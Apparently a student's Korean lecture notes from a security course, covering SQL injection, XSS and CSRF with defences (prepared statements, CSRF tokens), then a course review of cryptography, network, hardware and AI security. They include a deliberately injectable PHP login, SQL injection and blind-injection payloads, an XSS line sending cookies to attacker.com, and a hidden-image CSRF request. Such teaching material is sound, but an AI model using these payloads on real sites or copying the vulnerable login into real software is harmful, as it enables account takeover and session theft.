그런데 HTTP를 쓰는 이상 Vulnerable한 것은 변하지 않는다.
그래서 HTTPS(Secured)를 쓰는 것이다.

이제 본격적으로 SQL이라는 것에대해서 알아보자.
`login.php`
```php
<?php
 `$id = $`_POST['id'];
 `$pw = $`_POST['pw'];
 `$q = "SELECT * FROM user WHERE id='$`id' AND pw='`$pw'";
 $`r = mysql_query(`$q);
 ?>
```

<br>

DB에 Table이 다음과 같이 형성된다.  

<br>

|  id   |    pw    |       snn       | ... |  
| :---: | :------: | :-------------: | :-: |  
| jason |   asdf   | `990515-******` | ... |  
| admin | qwer1234 | `970403-******` | ... |  
|   :   |    :     |        :        |     |  

<br>

` SELECT * FROM user WHERE id='jason' AND pw='asdf'`  
사용자가 위와 같이 Query를 하면 Server-side Code가 DB의 Table에서 해당 내용을 가져오며 상호작용 하게된다.  

<br>

🔫 **SQL Injection**  
php의 `--`는 c의 `//`와 같다.  
```php
SELECT * FROM user WHERE id=‘admin’ ––’ AND ...
```
- 위와 같이 Query를 보내면 뒷부분이 주석 처리가 돼서 DB에 들어가 있는 `admin`의 모든 행이 출력된다.  
따라서 비밀번호를 몰라도 로그인이 가능하게 되는 것이다.  

<br>

🔫 **Blind SQL Injection**  
그런데 로그인은 가능해도 로그인 창에 `당신의 패스워드는 **** 입니다!` 라는 창이 뜨지는 않기 때문에, 여전히 Attacker는 실제 비밀번호가 무엇인지는 모른다.  
하지만 확장된 Injection 방법을 쓰면 비밀번호를 알아내는 게 가능하다.  

<br>

일단 Column이름이 'pw'라는 것을 알고있다는 가정 하에 다음과 같은 Query를 보낸다고 해보자.  
```php
SELECT * FROM user WHERE id=‘admin’ ––’ AND SUBSTR(pw,1,1)==‘a’ --
```
- 위와 같이 Query를 보내면 뒷부분이 비밀번호의 첫 글자를 가져와서 'a'와 비교하는 함수가 된다.  
따라서 One-by-one으로 확인해가며 하나 맞추고 그 다음은 `SUBSTR(pw,2,1)=='a'`... 식으로 보내어 Login에 성공했는지 여부에 따라 비밀번호의 실제 값을 알 수 있게된다.  

<br>

`그러니까 우리가 실습 시험에서 푼 guess.c 문제가 그냥 빡치는 Bruth Force 문제가 아니라 상당히 자주 사용되는 Injection 기법이었다는 것이다..`  

<br>

그럼 Column 이름은 어떻게 알아낼까? 이에 대해 간단하게만 알아보자.  
- 그냥 개발자에 빙의하여 예상  
- Union-based SQL injection 이용  
- MySQL's metadata table `information_schema`에 접근  

<br>

그럼 방어는 어떻게 할까?  

<br>

🛡️ **Preventing SQL Injection**  
앞선 Injection은 원초적으로 문자열이 Code로 인식되었기 때문에 발생했던 문제이다.  

<br>

따라서 다음과 같이 Query를 받을 때 자체적으로 Escaping 문자를 넣어서 이를 방지할 수도 있다.  
```php
... WHERE id=‘admin\’ --’ AND pw=... // '\'
```

<br>

근데 우리가 이걸 일일이 넣고 있을 수는 없기에, 보통 Language Level에서 이를 위한 Tool을 다음과 같이 제공해준다.  
```php
$`m = new mysqli(...);
`$stmt = $`m->prepare(“SELECT * FROM user WHERE id=? and pw=?”);
`$stmt->bind_param(“ss”, $`id, `$pw);
$`stmt->execute();
```

#### ⚠️ Cross-site Scripting (XSS)

먼저, 앞서 설명한 JavaScript와 Cookie에 대해서 상기하고 넘어가자.
- JavaScript: Web Page에서 더 Dynamic한 상호작용을 할 수 있도록 한다.
- Cookie: Web Server가 사용자에 대한 이전의 정보를 기억할 수 있게 하는 것

이제 본격적으로 Cross-site Scripting에 대해서 알아보자.

지금까지의 취약점이랑은 살짝 다른게
앞에서는 Attacker에 의해 Server-side Code에서 문제가 발생했지만,
XSS에서는 Attacker에 의해 Client-side Code쪽에서 문제가 발생한다.

Attacker가 Client-size Code에 다음과 같은 JS Code를 삽입한다고 생각해보자.
```js
<script>
window.location="http://attacker.com?" + document.cookie
</script>
```

그러면 Session ID (SID) Cookie가 Attacker가 구축한 Website로 날아가게 된다.
- 만약 Attacker가 `index.php`라는 ``$_GET['SID']`를 Dump하는 페이지를 구축해놨으면 SID가 그 사이트에 기록되게 된다.
- 그리고 Attacker는 이 정보를 바탕으로 악의적인 짓을 저지를 수 있게된다.  

<br>

여기까지가 공격의 개괄적인 시나리오이다.  

<br>

🔫 **Stored XSS (a.k.a Persistent XSS)**  
`✏️ 정리 필요!`  

<br>

🔫 **Reflected XSS**  
`✏️ 정리 필요!`  
#### ⚠️ Cross-site Request Forgery (CSRF)  

<br>

이제 마지막 공격 방식에 대해서 알아보자.  

<br>

먼저 앞선 경우와 마찬가지로 Target Wdb Server를 하나 가정하고 시작하자.  
이 `abc.com`이라는 Target Web Server는 게시판 기능을 운영하고 있다.  
다음과 같음 HTTP Request를 보냄으로써 특정 게시글을 지우거나 수정할 수 있다.  
```
USER -> abc.com?action=edit&num=105 -> SERVER
```
타인이 내 Post를 Edit하려고 하면 막아야 할 것이다.  

<br>

공격자 Server도 가정하자.  
`puppy.com`이라는 Victim을 낚으려고 강아지 사진을 올려둔 사이트가 있다고 가정하자.  
이 `puppy.com`에 들어가면 Attacker의 Javascrpit Code가 실행이 될 것이다.  

<br>

그러면 이제 Victim이 한 탭에서는 `abc.com`을, 한 탭에서는 `puppy.com`을 켜놓고 있다고 하자.  

<br>

이때 여기서 공격자가 바로 어떤 document.cookie를 Execute하는 것은 의미가 없다.  
Same Origin Policy 때문인데, CSRF는 이를 벗어나서 공격할 수 있다.  

<br>

🔫 **CSRF**  
Attacker의 Server에 다음과 같이 abc.com의 이미지를 긁어오려고 하는 HTTP Request가 있다고 가정하자.  
```
<img src="abc.com?action=delete&num=100" height="0" width="0"> </img>
```
위와 같은 이미지는 없으므로 당연히 아무 이미지도 안 뜰 것이다.  

<br>

대신 `abc.com`의 뒤에있는 `action=delete&num=100`으로 조용히 상호작용이 시작된다.  
만약 `abc.com?action=delete&num=202`라는 Request를 보내게 되면 특정 게시글이 지워질 수도 있는 것이다.  

<br>

이런식으로 GET parameter를 잘 조정함으로써 더 다양한 공격이 가능하게 된다.  

<br>

그렇다면 이 CSRF를 어떻게 방어할 수 있을까?  

<br>

🛡️ **Preventing CSRF**  
- GET Method가 아니라 POST Method를 사용하더라도 CSRF를 막을 수는 없다.  
- 대신, Website에서 확인을 위해 CSRF Token을 이용할 수 있다.  
```html
<...onclick="abc.com?action=edit &num=105&token=e8cf3a" ...>
```
이 Token들이 어떻게 사용될까?  

<br>

일단 `puppy.com`은 제외하고 Victim User와 `abc.com`이 상호작용하고 있는 상황으로 돌아와보자.  

<br>

Server Side Code 쪽에서 결정한 Token(Random String)을 User가 `abc.com`에 접속할 때부터 위의 코드와 같이 User가 보는 HTML Source Code에 포함시킨다.  
- User Side: 이제 HTTP Request를 보내면 Token까지 같이 날라가게 되고 Server Side Code에서 이를 Verify한다. `token=e8cf3a`  
- Attacker Side: 반면에 CSRF 공격을 통해서 Request Forsery로 User가 모르는 Request가 Server Side Code쪽으로 날라가게 되면 Token을 지정할 수 없기 때문에 해당 Request는 효력을 잃게된다. `No token`  
이는 Canary Check와 매우 유사하다고도 볼 수 있다.  

<br>

❓ 그럼 `puppy.com`에서 Token값을 알아내면 어떻게 하나?  
A) 이는 SOP(Security Origin Policy)라는 규칙에 의해서 예방된다.  

<br>

# 11. Course Review  

<br>

들어가기 전에..  
📝 표시가 되어있는 부분은 교수님꼐서 시험에 나올 수 있다고 언급한 부분이다.  

<br>

/ **Cryptography(암호학)**  
보안에서 굉장히 중요한 툴이다.  
보안 = 암호학 이라고 보는 사람도 있을 정도니 말 다했다.  

<br>

그럼 메시지를 보내는 것에서 암호학의 역할을 간단하게 살펴보자.  
- Confidentiality: 메시지를 유출 없이 전달  
- Integrity: 왜곡 없이 전달  

<br>

📝  
```
Message(Plaintext) --{Encrypted}-> Transfer --{Decrypted}-> Message(Plaintext)
```
암호화(Encrypt)/복호화(Decrypt)에 사용되는 키와 관련하여 다음과 같은 두 가지 분류가 있을 수 있다.  
- Symmetric Key: 송신자와 수신자가 같은 키를 공유  
- Assymmetric Key: 송신자와 수신자가 다른 키를 공유 `Public Key, Private Key`  

<br>

/ **Network Security**  
애초에 Network Protocol 설계 자체가 어떠한 취약점에 노출될 수 있기 때문에 Network Sequrity의 존재는 필수불가결하다.  

<br>

**Sniffing**: 쉽게 말해서 엿듣는 것으로, Network 상의 패킷을 도청하는 것이다.  
Ex)   
Ethernet Protocol - Segment가 Wire를 공유하기 때문에 `듣고 있다가.. 어? 나한테 보내는 패킷이네! 접수` 자연스래 Sniffing에 노출된다.  

<br>

**Sppofing**: Network 상의 패킷 데이터를 조작하여 다른 사람으로 사칭하는 것이다.  
Ex)  
IP Spoofing - 나의 IP가 `1.2.3.4` 라더라도 다른 IP를 가진 것처럼 패킷을 전송 하는 것이다.  
ARP Spoofing - `1.2.3.4` IP를 가진 사람이 나인 것처럼 사칭하여 패킥을 받는 것이다.  
DNS Spoofing - `sogang.ac.kr`에 해당하는 IP는 내가 가진 `1.2.3.4`라고 거짓 정보를 알려주는 것이다.  

<br>

📝 Sniffing와 Sppofing은 서로 다른 개념이다.  

<br>

Denial-of-Service (DoS) Attacks: Network나 시스템에 과부하를 유도하여 정상적인 서비스를 방해하는 공격  
SYN flooding - TCP 연결을 이용한 서버 자원 고갈  
DNS Amplification - 증폭된 트래픽을 이용한 대규모 네트워크 공격  

<br>

/ **Hardware Security**  
물리적인 구조를 이용하여 공격하는 방식이다.  
다음은 최근에 가장 이슈였던 Hardware Security이다.  

<br>

<img src="Docs/Pasted image 20241205130421.png" width="200">
  
📝 **Rowhammer Attack**: 노란색 영역에 해당하는 bit를 계속해서 Update 시킴으로써 전기적 현상을 일으켜 보라색 영역에 해당하는 곳에 정보적 노이즈를 일으키는 것이다.  

<br>

**Spectre and Meltdown Attack**: 현대 CPU에서 성능을 올리기 위해 예측하여 한 발 앞서 Execute하는 Speculative Execution Feature를 이용하여 접근해서는 안되는 곳의 값을 읽어온다거나 하는 공격  

<br>

/ **AI Security**  

<br>

**Security for AI**: AI 시스템 자체를 공격하는 것  
- 📝 Adversarial Attacks: AI에 노이즈 같은 걸 먹여서 오작동을 일으키는 것 `Glaze`  

<br>

**AI for Security**: AI를 이용하여 SW 취약점을 찾는 것  

<br>


<br>
